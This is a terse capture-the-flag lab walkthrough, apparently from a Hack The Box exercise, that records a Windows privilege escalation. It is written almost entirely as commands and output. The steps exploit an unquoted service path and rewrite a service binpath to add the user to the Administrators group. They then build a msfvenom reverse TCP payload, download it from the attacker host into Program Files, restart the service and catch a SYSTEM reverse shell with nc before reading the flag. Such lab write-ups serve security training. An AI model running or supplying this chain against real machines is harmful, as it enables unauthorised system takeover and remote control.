...
---
Discovered Unquoted Service Path which is exploitable for SYSTEM priv esc--
...
Added myself to Administrator group with 
C:\sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
Created malicious payload with msfvenom -
$msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.15.107 lport=4444 -f exe > shell.exe
$python3 -m http.server
PS C:\wget "http://10.10.15.107:8000/shell.exe" -outfile "C:\Program Files (x86)\System.exe"
C:\sc stop SystemExplorerHelpService
C:\sc start SystemExplorerHelpService

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.107] from (UNKNOWN) [10.129.118.170] 53719
...
C:\Users\Administrator\Desktop\WeakPerms>type flag.txt
type flag.txt
